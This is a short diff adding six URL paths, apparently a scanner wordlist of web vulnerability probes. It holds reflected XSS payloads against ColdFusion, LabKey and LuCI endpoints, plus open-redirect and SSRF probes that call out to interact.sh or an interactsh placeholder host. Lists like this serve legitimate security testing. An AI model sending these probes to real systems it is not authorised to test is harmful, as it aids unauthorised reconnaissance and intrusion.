@@ -1,0 +1,6 @@
+/CFIDE/wizards/common/_logintowizard.cfm?%22%3E%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/__r2/query-printRows.view?schemaName=ListManager&query.queryName=ListManager&query.sort=Nameelk5q%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ezp59r&query.containerFilterName=CurrentAndSubfolders&query.selectionKey=%24ListManager%24ListManager%24%24query&query.showRows=ALL
+/labkey/__r1/login-login.view?returnUrl=http://interact.sh
+/plugins/servlet/gadgets/makeRequest
+/external_content/retrieve/oembed?endpoint=http://{{interactsh-url}}&url=foo
+/cgi-bin/luci/site_access/?url=%22%20onfocus=alert(document.domain)%20autofocus=1
